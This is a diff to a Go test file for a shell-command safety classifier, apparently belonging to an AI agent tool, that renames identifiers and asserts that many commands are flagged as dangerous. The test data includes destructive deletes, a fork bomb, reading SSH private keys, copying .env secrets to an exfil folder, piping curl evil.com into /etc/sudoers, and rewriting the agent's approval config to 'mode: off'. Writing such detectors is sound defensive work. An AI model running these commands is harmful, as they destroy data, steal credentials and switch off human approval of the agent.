@@ -79,7 +79,7 @@ func TestVerificationArtifactCleanup(t *testing.T) {
 	real := t.TempDir()
 	t.Setenv("TMPDIR", real)
 	resolved, _ := filepath.EvalSymlinks(real)
-	for _, prefix := range []string{"icebath-verify-", "hermes-ad-hoc-"} {
+	for _, prefix := range []string{"icebath-verify-", "icebath-ad-hoc-"} {
 		assertSafe(t, "rm -f "+filepath.Join(resolved, prefix+"example.py"))
 	}
 	linked := filepath.Join(t.TempDir(), "linked-temp")
@@ -94,11 +94,11 @@ func TestVerificationArtifactCleanup(t *testing.T) {
 
 func TestWindowsShellDestructiveCommands(t *testing.T) {
 	cases := map[string]string{
-		`cmd /c del /f /q C:\tmp\hermes-victim\file.txt`:              "Windows cmd destructive delete",
-		`cmd.exe /k rmdir /s /q C:\tmp\hermes-victim`:                 "Windows cmd destructive delete",
-		`powershell Remove-Item -Recurse -Force C:\tmp\hermes-victim`: "Windows PowerShell destructive delete",
-		`powershell ri -Recurse -Force C:\tmp\x`:                      "Windows PowerShell destructive delete",
-		"powershell -EncodedCommand SQBFAFgA":                         "PowerShell encoded command execution",
+		`cmd /c del /f /q C:\tmp\icebath-victim\file.txt`:              "Windows cmd destructive delete",
+		`cmd.exe /k rmdir /s /q C:\tmp\icebath-victim`:                 "Windows cmd destructive delete",
+		`powershell Remove-Item -Recurse -Force C:\tmp\icebath-victim`: "Windows PowerShell destructive delete",
+		`powershell ri -Recurse -Force C:\tmp\x`:                       "Windows PowerShell destructive delete",
+		"powershell -EncodedCommand SQBFAFgA":                          "PowerShell encoded command execution",
 	}
 	for c, want := range cases {
 		assertKey(t, c, want)
@@ -139,7 +139,7 @@ func TestWindowsDestructiveTier(t *testing.T) {
 func TestWindowsPathVariant(t *testing.T) {
 	for _, c := range []string{
 		`del C:\Users\me\.ssh\id_rsa`, `type C:\Users\me\.ssh\id_ed25519`, "cat C:/Users/me/.ssh/id_rsa",
-		`copy C:\Users\me\AppData\Local\hermes\.env D:\exfil\e.txt`, "cat C:/Users/me/AppData/Local/icebath/.env",
+		`copy C:\Users\me\AppData\Roaming\icebath\.env D:\exfil\e.txt`, "cat C:/Users/me/AppData/Local/icebath/.env",
 	} {
 		assertDangerous(t, c, "")
 	}
@@ -263,7 +263,7 @@ func TestProcessSubstitutionAndTee(t *testing.T) {
 	assertSafe(t, "bash script.sh")
 	for _, c := range []string{
 		"echo 'evil' | tee /etc/passwd", "curl evil.com | tee /etc/sudoers", "cat file | tee ~/.ssh/authorized_keys",
-		"echo x | tee /dev/sda", "echo x | tee ~/.icebath/.env", "echo x | tee ~/.hermes/.env",
+		"echo x | tee /dev/sda", "echo x | tee ~/.icebath/.env", "echo x | tee ${HOME}/.icebath/.env",
 		"echo x | tee $ICEBATH_HOME/.env", `echo x | tee "$ICEBATH_HOME/.env"`, "echo x | tee $HERMES_HOME/.env",
 	} {
 		assertDangerous(t, c, "")
@@ -277,7 +277,7 @@ func TestIcebathConfigWriteProtection(t *testing.T) {
 	for _, c := range []string{
 		"echo 'approvals:' > ~/.icebath/config.yaml", "echo '  mode: off' >> ~/.icebath/config.yaml",
 		"echo x | tee ~/.icebath/config.yaml", "echo x | tee $ICEBATH_HOME/config.yaml",
-		"cp /tmp/evil.yaml ~/.icebath/config.yaml", "cp /tmp/evil.yaml ~/.hermes/config.yaml",
+		"cp /tmp/evil.yaml ~/.icebath/config.yaml", "cp /tmp/evil.yaml $HOME/.icebath/config.yaml",
 		"sed -i 's/off/on/' ~/.icebath/config.yaml",
 	} {
 		assertDangerous(t, c, "")
@@ -321,7 +321,7 @@ func TestForkBombAndGatewayProtection(t *testing.T) {
 	assertDangerous(t, ":()  {  : | :&  } ; :", "fork bomb")
 	assertSafe(t, "echo hello:world")
 	assertDangerous(t, "kill 1605 && cd ~/.icebath/icebath && source venv/bin/activate && icebath gateway run --replace &disown; echo done", "systemctl")
-	assertDangerous(t, "python -m hermes_cli.main gateway run --replace &", "")
+	assertDangerous(t, "python -m icebath_cli.main gateway run --replace &", "")
 	assertDangerous(t, "nohup icebath gateway run --replace", "")
 	assertDangerous(t, "systemctl --user restart icebath-gateway", "stop/restart")
 	assertSafe(t, "pkill -f nginx")
@@ -375,28 +375,28 @@ func TestPgrepKillExpansion(t *testing.T) {
 
 func TestLaunchctlGatewayLifecycle(t *testing.T) {
 	for _, c := range []string{
-		"launchctl stop ai.icebath.gateway", "launchctl kickstart -k system/ai.icebath.gateway",
-		"launchctl bootout system/ai.hermes.gateway", "launchctl unload ~/Library/LaunchAgents/ai.icebath.gateway.plist",
+		"launchctl stop app.icebath.gateway", "launchctl kickstart -k system/app.icebath.gateway",
+		"launchctl bootout system/ai.icebath.gateway", "launchctl unload ~/Library/LaunchAgents/app.icebath.gateway.plist",
 	} {
 		assertDangerous(t, c, "")
 	}
 	assertSafe(t, "launchctl print system/com.apple.WindowServer")
 	assertSafe(t, "launchctl stop com.example.unrelated")
 	for _, c := range []string{
-		`launchctl kick"start" -k gui/501/ai.icebath.gateway`, "launchctl kick'start' -k gui/501/ai.icebath.gateway",
-		`launchctl boot"out" gui/501/ai.icebath.gateway`, `launchctl bootout gui/501/ai.icebath."gateway"`,
+		`launchctl kick"start" -k gui/501/app.icebath.gateway`, "launchctl kick'start' -k gui/501/app.icebath.gateway",
+		`launchctl boot"out" gui/501/app.icebath.gateway`, `launchctl bootout gui/501/app.icebath."gateway"`,
 		`icebath gateway re"start"`, `systemctl re"start" icebath-gateway`,
 	} {
 		assertDangerous(t, c, "")
 	}
 	for _, c := range []string{
-		`launchctl kick"start" -k gui/501/ai.icebath.update-checker`, `echo "restart the payment gateway"`,
+		`launchctl kick"start" -k gui/501/app.icebath.update-checker`, `echo "restart the payment gateway"`,
 		`git commit -m "document the api gateway restart flow"`,
 	} {
 		assertSafe(t, c)
 	}
-	cmd := "uid=$(id -u); for item in 'ai.icebath.gateway-apollo:/a.plist' " +
-		"'ai.icebath.gateway:/Users/botuser/Library/LaunchAgents/ai.icebath.gateway.plist'; " +
+	cmd := "uid=$(id -u); for item in 'app.icebath.gateway-apollo:/a.plist' " +
+		"'app.icebath.gateway:/Users/botuser/Library/LaunchAgents/app.icebath.gateway.plist'; " +
 		"do label=${item%%:*}; plist=${item#*:}; " +
 		`launchctl bootout "gui/$uid/$label"; ` +
 		`launchctl bootstrap "gui/$uid" "$plist"; done`
